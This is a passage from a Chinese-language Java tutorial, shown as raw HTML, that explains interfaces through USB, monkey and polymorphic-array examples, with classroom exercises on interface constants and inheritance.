class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">AA</span> <span class="hljs-variable">aa</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AA</span>();<br>        aa.job();<br>        <span class="hljs-type">BB</span> <span class="hljs-variable">bb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BB</span>();<br>        bb.job();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221028164714674.png" alt="image-20221028164714674" style="zoom:50%;" /><h2 id="8-接口"><a href="#8-接口" class="headerlink" title="8.接口"></a>8.接口</h2><p>现实中的接口：</p><p>例如usb插槽就是现实中的接口，可以把手机、相机、u盘插在usb插槽上，不容担心插槽的专一性，因为做usb插槽的厂家和做各种设备的厂家都遵守了统一的规范，包括尺寸、排线等等。</p><p>接口在程序中也会存在，下面用程序来模拟一下接口：</p><p>创建一个接口UsbInterface:</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221028170331045.png" alt="image-20221028170331045" style="zoom:50%;" /><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UsbInterface</span> &#123; <span class="hljs-comment">//接口</span><br>    <span class="hljs-comment">//规定接口的相关方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">stop</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>再穿件一个Phone类，implement是实现接口的关键字：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Phone类实现 UsbInterface</span><br><span class="hljs-comment">//即 Phone类需要实现 UsbInterface接口 规定/声明的方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Phone</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UsbInterface</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;手机开始了工作&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">stop</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;手机停止了工作&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Camera类，和Phone类类似：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Camera</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UsbInterface</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;相机开始了工作。&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">stop</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;相机停止了工作。&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Computer类，可以插接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Computer</span> &#123;<br>    <span class="hljs-comment">//编写一个方法，表示计算机工作</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">work</span><span class="hljs-params">(UsbInterface usbInterface)</span>&#123;<br>      <span class="hljs-comment">//通过接口，调用方法</span><br>        usbInterface.start();<br>        usbInterface.stop();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>测试类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Interface01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//创建手机、相机</span><br>        <span class="hljs-type">Camera</span> <span class="hljs-variable">camera</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Camera</span>();<br>        <span class="hljs-type">Phone</span> <span class="hljs-variable">phone</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phone</span>();<br>        <span class="hljs-comment">//创建计算机</span><br>        <span class="hljs-type">Computer</span> <span class="hljs-variable">computer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Computer</span>();<br>        computer.work(phone); <span class="hljs-comment">//把手机接入到计算机</span><br>        System.out.println(<span class="hljs-string">&quot;============&quot;</span>);<br>        computer.work(camera); <span class="hljs-comment">//把相机接入到计算机</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221028171609848.png" alt="image-20221028171609848" style="zoom:50%;" /><h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">interface 接口名&#123;<br>属性;<br>方法;(<span class="hljs-number">1.</span>抽象方法 <span class="hljs-number">2.</span>默认实现方法 <span class="hljs-number">3.</span>静态方法)<br>必须实现的接口的抽象方法<br>&#125;<br>class 类名 implement 接口&#123;<br>  自己属性;<br>  自己方法;<br>  必须实现的接口的抽象方法<br>&#125;<br></code></pre></td></tr></table></figure><p>小结：</p><ol><li><p>在Jdk7.0前，接口里的所有方法都没有方法体，即都是抽象方法</p></li><li><p>jdk8.0后接口可以有静态方法，默认方法，也就是说接口中可以有方法的具体实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">AInterface</span> &#123;<br>    <span class="hljs-comment">//写属性</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>    <span class="hljs-comment">//写方法</span><br>    <span class="hljs-comment">//在接口中，抽象方法，可以省略abstract关键字</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hi</span><span class="hljs-params">()</span>;<br>    <span class="hljs-comment">//在jdk8后，可以有默认实现方法，但需要使用default关键字修饰</span><br>    <span class="hljs-keyword">default</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ok</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;ok...&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//在jdk8后，可以有静态方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cry</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;cry....&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>接口存在的意义：更好管理。例如三个员工写的类，同样的功能使用的不同方法，会很难管理。可以通过接口进行统一，显示员工写的方法。</p><h3 id="注意事项和细节"><a href="#注意事项和细节" class="headerlink" title="注意事项和细节"></a>注意事项和细节</h3><ol><li><p>接口<strong>不能被实例化</strong>（同抽象类）</p></li><li><p>接口中所有的方法是public方法，接口中抽象方法，可以不用abstract修饰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">IA</span>&#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">say</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">hi</span><span class="hljs-params">()</span>;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IA</span>&#123;<br>    <span class="hljs-comment">//void say() 是错误的，范围被缩小了</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">say</span><span class="hljs-params">()</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>一个普通类实现接口，就必须将该接口的所有方法都实现</p></li><li><p>抽象类去实现接口时，可以不实现接口的抽象方法</p></li><li><p><strong>一个类</strong>同时可以实现<strong>多个接口</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">IB</span>&#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">hi</span><span class="hljs-params">()</span>;<br>&#125;<br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">IC</span>&#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">say</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IB</span>,IC&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hi</span><span class="hljs-params">()</span> &#123;&#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">say</span><span class="hljs-params">()</span> &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>接口中的属性只能是final的</strong>，而且是<strong>public static final 修饰符</strong>。</p><p>比如int a&#x3D;1;实际上是public static final int a &#x3D; 1;（必须初始化）</p></li><li><p>接口中属性的访问形式：接口名.属性名</p></li><li><p>一个接口不能继承其它的类，但是<strong>可以继承多个别的接口</strong></p></li><li><p>接口的修饰符只能是public和默认，这点和类的修饰符是一样的</p></li></ol><h3 id="课堂练习1"><a href="#课堂练习1" class="headerlink" title="课堂练习1"></a>课堂练习1</h3><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221029001540649.png" alt="image-20221029001540649" style="zoom:50%;" /><p>解析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">A</span>&#123;<br>  <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">23</span>; <span class="hljs-comment">//等价 public static final int a = 23;</span><br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">A</span>&#123; <span class="hljs-comment">//正确</span><br>&#125;<br><br><span class="hljs-comment">//main中：</span><br><span class="hljs-type">B</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>(); <span class="hljs-comment">//OK</span><br>System.out.println(b.a); <span class="hljs-comment">//正确，23</span><br>System.out.println(A.a); <span class="hljs-comment">//正确，23</span><br>System.out.println(B.a); <span class="hljs-comment">//正确，23 </span><br></code></pre></td></tr></table></figure><h3 id="实现接口-vs-继承类"><a href="#实现接口-vs-继承类" class="headerlink" title="实现接口 vs 继承类"></a>实现接口 vs 继承类</h3><p>实现接口是对单继承模式的补充。</p><p>举例：</p><p>猴子会爬树，小猴子继承了爬树的能力也会爬树，但不能像鱼一样游泳或者和鸟一样飞翔。</p><p>所以可以用接口来拓展功能。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExtendsVsInterface</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">LittleMonkey</span> <span class="hljs-variable">wuKong</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LittleMonkey</span>(<span class="hljs-string">&quot;悟空&quot;</span>);<br>        wuKong.climbing();<br>        wuKong.swimming();<br>        wuKong.flying();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//猴子</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Monkey</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">climbing</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(name+<span class="hljs-string">&quot;会爬树&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Monkey</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//游泳</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Fishable</span>&#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">swimming</span><span class="hljs-params">()</span>;<br>&#125;<br><span class="hljs-comment">//飞翔</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Birdable</span>&#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">flying</span><span class="hljs-params">()</span>;<br>&#125;<br><span class="hljs-comment">//小猴子，继承</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LittleMonkey</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Monkey</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Fishable</span>,Birdable &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">LittleMonkey</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">super</span>(name);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">swimming</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(getName()+<span class="hljs-string">&quot;通过学习,可以像鱼儿一样游泳&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">flying</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(getName()+<span class="hljs-string">&quot;通过学习，可以像鸟儿一样飞翔&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221029154749534.png" alt="image-20221029154749534" style="zoom:50%;" /><p>小结：</p><p>当子类继承父类，就自动的拥有父类的功能。</p><p>如果子类需要拓展功能，可以通过接口的方式扩展。</p><ul><li>接口和继承<strong>解决的问题不同</strong><ul><li>继承的价值主要在于：解决代码的<strong>复用性和可维护性。</strong></li><li>接口的价值主要在于：设计。设计好各种规范（方法），让其他类去实现这些方法。即更加的灵活。</li></ul></li><li>接口比继承更加灵活<ul><li>继承满足is - a的关系，而接口只需满足like - a的关系</li></ul></li><li>接口在一定程度上实现代码解耦【即：接口规范性+动态绑定】</li></ul><h3 id="接口多态特性"><a href="#接口多态特性" class="headerlink" title="接口多态特性"></a>接口多态特性</h3><ol><li><p>多态参数</p><p>例如之前的Usb接口案例，UsbInterface usb既可以接受手机对象，又可以接受相机对象。体现了接口多态（接口引用可以指向实现了接口的类的对象）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InterfacePolyParameter</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//接口的多态提现</span><br>        <span class="hljs-comment">//接口类型的变量 if01 可以指向 实现了IF接口的对象实例</span><br>        <span class="hljs-type">IF</span> <span class="hljs-variable">if01</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Monster</span>();<br>        if01 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Car</span>();<br><br>        <span class="hljs-comment">//继承提现的多态</span><br>        <span class="hljs-comment">//父类类型的变量 a 可以指向 继承了AAA的子类的对象实例</span><br>        <span class="hljs-type">AAA</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BBB</span>();<br>        a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CCC</span>();<br><br>    &#125;<br>&#125;<br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">IF</span>&#123;&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Monster</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IF</span>&#123;&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Car</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IF</span>&#123;&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AAA</span>&#123;&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BBB</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AAA</span>&#123;&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CCC</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AAA</span>&#123;&#125;<br></code></pre></td></tr></table></figure></li><li><p>多态数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InterfacePolyArr</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//多态数组</span><br>        Usb[] usbs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Usb</span>[<span class="hljs-number">2</span>];<br>        usbs[<span class="hljs-number">0</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phone_</span>();<br>        usbs[<span class="hljs-number">1</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Camera_</span>();<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        给Usb数组中，存放Phone和相机对象，Phone类还有一个特有的方法call()</span><br><span class="hljs-comment">        请遍历Usb数组，如果是Phone对象，除了调用Usb接口定义的方法外</span><br><span class="hljs-comment">        还需要调用Phone特有方法call</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; usbs.length; i++) &#123;<br>            usbs[i].work();<span class="hljs-comment">//动态绑定..</span><br>            <span class="hljs-comment">//如果需要调用call，不能直接循环</span><br>            <span class="hljs-comment">//和前面一样，需要进行类型的向下转型</span><br>            <span class="hljs-keyword">if</span>(usbs[i] <span class="hljs-keyword">instanceof</span> Phone_)&#123; <span class="hljs-comment">//判断他的运行类型是Phone_</span><br>                ((Phone_) usbs[i]).call();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Usb</span>&#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">work</span><span class="hljs-params">()</span>;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Phone_</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Usb</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">call</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;手机可以打电话...&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">work</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;手机工作中...&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Camera_</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Usb</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">work</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;相机工作中...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出：</p><p>手机工作中…<br>手机可以打电话…<br>相机工作中…</p></li><li><p>接口存在<strong>多态传递</strong>现象</p><p>例如A类有A接口，而B接口继承了A接口，则意味着A类也可以实现B接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InterfacePolyPass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//接口类型的变量可以指向，实现了该接口的类的对象实例</span><br>        <span class="hljs-type">IG</span> <span class="hljs-variable">ig</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Teacher</span>();<br>        <span class="hljs-comment">//如果IG 继承了IH接口，而Teacher类实现了IG接口</span><br>        <span class="hljs-comment">//那么，实际上就相当于Teacher类也实现了IH接口</span><br>        <span class="hljs-type">IH</span> <span class="hljs-variable">ih</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Teacher</span>();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">IH</span>&#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">hi</span><span class="hljs-params">()</span>;<br>&#125;<br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">IG</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">IH</span>&#123;&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Teacher</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IG</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hi</span><span class="hljs-params">()</span> &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="课堂练习2"><a href="#课堂练习2" class="headerlink" title="课堂练习2"></a>课堂练习2</h3><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221030004713846.png" alt="image-20221030004713846" style="zoom:50%;" /><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">A</span>&#123;<br>  <span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-comment">//等价于public static final int x = 0;</span><br>&#125;<br><span class="hljs-keyword">class</span> <span 